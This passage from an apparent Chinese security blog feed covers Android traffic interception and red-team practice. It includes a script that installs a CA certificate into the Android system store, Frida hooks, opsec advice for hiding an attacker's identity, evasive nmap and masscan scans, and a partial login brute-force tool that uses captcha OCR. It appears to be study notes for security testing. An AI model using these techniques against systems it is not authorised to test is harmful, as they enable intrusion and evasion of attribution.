class="string">&quot;&quot;&quot;DER-&gt;PEM（如需要）并返回 PEM 路径&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run([<span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;x509&#x27;</span>, <span class="string">&#x27;-in&#x27;</span>, cert_path, <span class="string">&#x27;-noout&#x27;</span>],</span><br><span class="line">                           check=<span class="literal">True</span>, capture_output=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> cert_path          <span class="comment"># 已是 PEM</span></span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">            tmp = tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>, suffix=<span class="string">&#x27;.pem&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.run([<span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;x509&#x27;</span>, <span class="string">&#x27;-inform&#x27;</span>, <span class="string">&#x27;DER&#x27;</span>,</span><br><span class="line">                                <span class="string">&#x27;-in&#x27;</span>, cert_path, <span class="string">&#x27;-out&#x27;</span>, tmp.name], check=<span class="literal">True</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+] 自动 DER→PEM ：<span class="subst">&#123;tmp.name&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> tmp.name</span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-] 无法识别的证书格式&#x27;</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_subject_hash_old</span>(<span class="params">self, pem_path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回 8 位 subject_hash_old&quot;&quot;&quot;</span></span><br><span class="line">        r = subprocess.run([<span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;x509&#x27;</span>, <span class="string">&#x27;-subject_hash_old&#x27;</span>,</span><br><span class="line">                            <span class="string">&#x27;-in&#x27;</span>, pem_path], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> r.stdout.strip().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- 主转换 -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">convert_to_android_format</span>(<span class="params">self, cert_path: <span class="built_in">str</span>, out_dir: <span class="built_in">str</span> = <span class="string">&#x27;.&#x27;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        pem_path = <span class="variable language_">self</span>.ensure_pem(cert_path)</span><br><span class="line">        hash_val = <span class="variable language_">self</span>._get_subject_hash_old(pem_path)</span><br><span class="line">        out_file = os.path.join(out_dir, <span class="string">f&#x27;<span class="subst">&#123;hash_val&#125;</span>.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pem_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(out_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data.endswith(<span class="string">b&#x27;\n&#x27;</span>):</span><br><span class="line">                f.write(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pem_path != cert_path:           <span class="comment"># 清理临时文件</span></span><br><span class="line">            os.remove(pem_path)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Android 证书已生成 ：<span class="subst">&#123;out_file&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> out_file</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- ADB 上传 -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_via_adb</span>(<span class="params">self, cert_path: <span class="built_in">str</span>, device_path: <span class="built_in">str</span> = <span class="string">&quot;/sdcard/Download&quot;</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.adb_available:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] ADB 不可用&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        dev_list = subprocess.run([<span class="string">&#x27;adb&#x27;</span>, <span class="string">&#x27;devices&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;device&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> dev_list.stdout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] 未检测到连接设备&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        subprocess.run([<span class="string">&#x27;adb&#x27;</span>, <span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;mkdir&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>, device_path], capture_output=<span class="literal">True</span>)</span><br><span class="line">        target = <span class="string">f&#x27;<span class="subst">&#123;device_path&#125;</span>/<span class="subst">&#123;os.path.basename(cert_path)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run([<span class="string">&#x27;adb&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, cert_path, target], check=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] 上传完成 ：<span class="subst">&#123;target&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] ADB 上传失败&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- 提示 -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_instructions</span>(<span class="params">self, filename: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n---- 后续操作（需 root） ----&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;adb shell&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;su&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mount -o remount,rw /system&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mv /sdcard/Download/<span class="subst">&#123;filename&#125;</span> /system/etc/security/cacerts/&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;chmod 644 /system/etc/security/cacerts/<span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mount -o remount,ro /system&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;reboot&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- CLI -------------------- #</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;证书转换 &amp; ADB 上传&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;cert&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;原始证书文件（DER/PEM/PFX 均可）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output-dir&#x27;</span>, default=<span class="string">&#x27;.&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输出目录&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--device-path&#x27;</span>, default=<span class="string">&#x27;/sdcard/Download&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;设备目录&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--no-upload&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;仅转换，不上传&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    converter = AndroidCertConverter()</span><br><span class="line">    cert_0 = converter.convert_to_android_format(args.cert, args.output_dir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.no_upload:</span><br><span class="line">        ok = converter.upload_via_adb(cert_0, args.device_path)</span><br><span class="line">        <span class="keyword">if</span> ok:</span><br><span class="line">            converter.show_instructions(os.path.basename(cert_0))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\n[-] 上传失败，证书已生成：<span class="subst">&#123;cert_0&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\n[+] 转换完成：<span class="subst">&#123;cert_0&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">           __                                      __             ______   ________   ______  </span></span><br><span class="line"><span class="string">          /  |                                    /  |           /      \\ /        | /      \\ </span></span><br><span class="line"><span class="string">  _______ $$ |____    ______    ______   __    __ $$/  _______  /$$$$$$  |$$$$$$$$/ /$$$$$$  |</span></span><br><span class="line"><span class="string"> /       |$$      \\  /      \\  /      \\ /  \\  /  |/  |/       \\ $$ \\__$$/ $$ |__    $$ |  $$/ </span></span><br><span class="line"><span class="string">/$$$$$$$/ $$$$$$$  | $$$$$$  |/$$$$$$  |$$  \\/$$/ $$ |$$$$$$$  |$$      \\ $$    |   $$ |      </span></span><br><span class="line"><span class="string">$$      \\ $$ |  $$ | /    $$ |$$ |  $$ | $$  $$&lt;  $$ |$$ |  $$ | $$$$$$  |$$$$$/    $$ |   __ </span></span><br><span class="line"><span class="string"> $$$$$$  |$$ |  $$ |/$$$$$$$ |$$ \\__$$ | /$$$$  \\ $$ |$$ |  $$ |/  \\__$$ |$$ |_____ $$ \\__/  |</span></span><br><span class="line"><span class="string">/     $$/ $$ |  $$ |$$    $$ |$$    $$/ /$$/ $$  |$$ |$$ |  $$ |$$    $$/ $$       |$$    $$/ </span></span><br><span class="line"><span class="string">$$$$$$$/  $$/   $$/  $$$$$$$/  $$$$$$/  $$/   $$/ $$/ $$/   $$/  $$$$$$/  $$$$$$$$/  $$$$$$/  </span></span><br><span class="line"><span class="string">                                                                                              </span></span><br><span class="line"><span class="string">                                        support: .pem .crt .cer .key .der .cer .pfx .p12</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203202150977.png" alt="image-20251203202150977"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203202603982.png" alt="image-20251203202603982"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203202634914.png" alt="image-20251203202634914"></p>
</li>
<li><p>启动appproxy，选择需要抓包的程序以及配置相应的代理</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203205504045.png" alt="image-20251203205504045"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203205317743.png" alt="image-20251203205317743"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203220911475.png" alt="image-20251203220911475"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251203220932614.png" alt="image-20251203220932614"></p>
</li>
</ol>
<h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>APK就是一个压缩包，解压之后就能看到很多代码文件以及二进制文件。查壳的原理就是将apk解压之后，读取里面所有”.so”类型的文件名，根据文件名判断对应的壳类型，与cms指纹识别是一样的道理，甚至更简单，关键在于指纹库的强大。</p>
<ol>
<li><p>自己写一个脚本（ApkScan-PKID早就不更新了，且指纹太老，不建议使用）</p>
</li>
<li><p>Detect It Easy（DIE）：开源免费，且一直更新，可通过Microsoft Store下载安装。功能比较强大，里面整合了多个工具的功能。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251202211432654.png" alt="image-20251202211432654"></p>
</li>
<li><p>Virus Total：专门分析恶意程序的平台，可以用来分析apk，解析相关信息。DIE工具里面就内置了这个平台</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251202212021068.png" alt="image-20251202212021068"></p>
</li>
</ol>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;包名.类名&quot;</span>);</span><br><span class="line">    clazz.函数名.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">pa, pb</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==================  Frida Start  ==================&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数1：&quot;</span> + pa);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数2：&quot;</span> + pb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*打印trace（调用链）*/</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &lt; stack.<span class="property">length</span>; i++) &#123;   <span class="comment">//前3帧是Frida内部，略过</span></span><br><span class="line">            <span class="keyword">const</span> clazz_   = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> method  = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file    = stack[i].<span class="title function_">getFileName</span>() || <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line    = stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;clazz_&#125;</span>.<span class="subst">$&#123;method&#125;</span> (<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)调用了↑`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*继续执行原方法（原函数若没有返回值，可以只进行调用）*/</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.函数名(pa, pb);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;结果：&quot;</span> + result);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===================  Frida End  ===================\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></blockquote>
<h2 id="webview-loadurl"><a href="#webview-loadurl" class="headerlink" title="webview-loadurl"></a>webview-loadurl</h2><h3 id="loadurl"><a href="#loadurl" class="headerlink" title="loadurl"></a>loadurl</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.webkit.WebView&quot;</span>);</span><br><span class="line">    clazz.<span class="property">loadUrl</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">pa</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==================  Frida Start  ==================&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数1：&quot;</span> + pa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*打印trace（调用链）*/</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &lt; stack.<span class="property">length</span>; i++) &#123;   <span class="comment">//前3帧是Frida内部，略过</span></span><br><span class="line">            <span class="keyword">const</span> clazz_   = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> method  = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file    = stack[i].<span class="title function_">getFileName</span>() || <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line    = stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;clazz_&#125;</span>.<span class="subst">$&#123;method&#125;</span> (<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)调用了↑`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*继续执行原方法（原函数若没有返回值，可以只进行调用）*/</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">loadUrl</span>(pa);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===================  Frida End  ===================\n&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
  </entry>
  <entry>
    <title>红队笔记</title>
    <url>/RedteamNotes.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="反溯源"><a href="#反溯源" class="headerlink" title="反溯源"></a>反溯源</h2><ol>
<li><p>网络隔离：</p>
<ul>
<li><p>系统代理：ClashVerge&#x2F;V2rayN + 机场节点</p>
</li>
<li><p>代理池：爆破的时候，选择代理池，避免单个节点被封</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[proxifly|每5min获取全球免费节点]: https://github.com/proxifly/free-proxy-list/blob/main/proxies/all/data.txt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>环境隔离：在虚拟机里面搭建攻击机&#x2F;买一台新机器专门用来做攻击机，攻击机不允许和个人用机有直接交互。怎么交换信息：攻击机(加密数据&#x2F;解密数据) &lt;-&gt; vps(可以搭个服务) &lt;-&gt; PC+代理(加密数据&#x2F;解密数据)</p>
</li>
<li><p>数据隔离：攻击机上面不要出现任何个人数据，一律不准使用国内软件聊天软件，使用验证码&#x2F;随机密码进行登录，使用测试账号</p>
</li>
<li><p>接收数据（反弹shell&#x2F;外带数据）：在VPS上接收，攻击机+系统代理 -&gt; VPS1 -&gt; …… -&gt; 爆破机</p>
</li>
<li><p>VPS：使用ssh密钥进行登陆，严禁使用密码</p>
</li>
</ol>
<h1 id="WEB打点"><a href="#WEB打点" class="headerlink" title="WEB打点"></a>WEB打点</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><blockquote>
<p>nmap扫存活主机 -&gt; masscan&#x2F;fscan扫端口 -&gt; nmap扫服务版本</p>
</blockquote>
<ol>
<li><p>masscan</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.108.13 --rate 200 --source-ip 192.168.101.2 --source-port 40000-40007 --ttl 64 --wait 2 --randomize-hosts --randomize-ports &gt;&gt; 192_168_108_13_ports.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>fscan</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fscan -h 192.168.108.0/24 &gt;&gt; 192_168_108_0_fscan.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>nmap</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.108.0/24 &gt;&gt; 192_168_108_0_nmap.txt</span><br><span class="line">nmap 192.168.108.13 -p139,49172,445,135,49268,3389,49160,49154,49152,60966,80 -sV -sS -D RND:10 -mtu 8 &gt;&gt; 192_168_108_13_nmap.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="爆破登录页"><a href="#爆破登录页" class="headerlink" title="爆破登录页"></a>爆破登录页</h2><ol>
<li><p>basic-authorize: hydra</p>
</li>
<li><p>数据包没有加密：burpsuite</p>
</li>
<li><p>数据包有加密：爬虫</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Web登录爆破工具</span></span><br><span class="line"><span class="string">使用Playwright自动化浏览器进行登录爆破</span></span><br><span class="line"><span class="string">根据返回的长度进行判断</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span>, <span class="type">Optional</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> playwright.async_api <span class="keyword">import</span> async_playwright, Browser, BrowserContext, Page</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomHelpFormatter</span>(argparse.HelpFormatter):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_format_action_invocation</span>(<span class="params">self, action</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> action.option_strings:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>()._format_action_invocation(action)</span><br><span class="line">        default = <span class="variable language_">self</span>._get_default_metavar_for_optional(action)</span><br><span class="line">        args_string = <span class="variable language_">self</span>._format_args(action, default)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join(action.option_strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginBruster</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, </span></span><br><span class="line"><span class="params">                 target_url: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 username_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 password_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 captcha_img_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 captcha_input_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 login_button_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 max_threads: <span class="built_in">int</span> = <span class="number">5</span>,</span></span><br><span class="line"><span class="params">                 success_url_contains: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                 success_text_contains: <span class="built_in">str</span> = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化登录爆破器</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            target_url: 目标URL</span></span><br><span class="line"><span class="string">            username_xpath: 用户名输入框XPath</span></span><br><span class="line"><span class="string">            password_xpath: 密码输入框XPath</span></span><br><span class="line"><span class="string">            captcha_img_xpath: 验证码图片XPath</span></span><br><span class="line"><span class="string">            captcha_input_xpath: 验证码输入框XPath</span></span><br><span class="line"><span class="string">            login_button_xpath: 登录按钮XPath</span></span><br><span class="line"><span class="string">            max_threads: 最大线程数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.target_url = target_url</span><br><span class="line">        <span class="variable language_">self</span>.username_xpath = username_xpath</span><br><span class="line">        <span class="variable language_">self</span>.password_xpath = password_xpath</span><br><span class="line">        <span class="variable language_">self</span>.captcha_img_xpath = captcha_img_xpath</span><br><span class="line">        <span class="variable language_">self</span>.captcha_input_xpath = captcha_input_xpath</span><br><span class="line">        <span class="variable language_">self</span>.login_button_xpath = login_button_xpath</span><br><span class="line">        <span class="variable language_">self</span>.max_threads = max_threads</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.results = []</span><br><span class="line">        <span class="variable language_">self</span>.lock = threading.Lock()</span><br><span class="line">        <span class="variable language_">self</span>.success_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.failed_count = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_wordlist</span>(<span class="params">self, file_path: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;加载字典文件&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">return</span> [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;错误：找不到文件 <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;加载文件 <span class="subst">&#123;file_path&#125;</span> 时出错：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">preprocess_captcha</span>(<span class="params">self, image_data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        预处理验证码图片并识别</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            image_data: 图片数据</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            识别出的验证码文本</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span 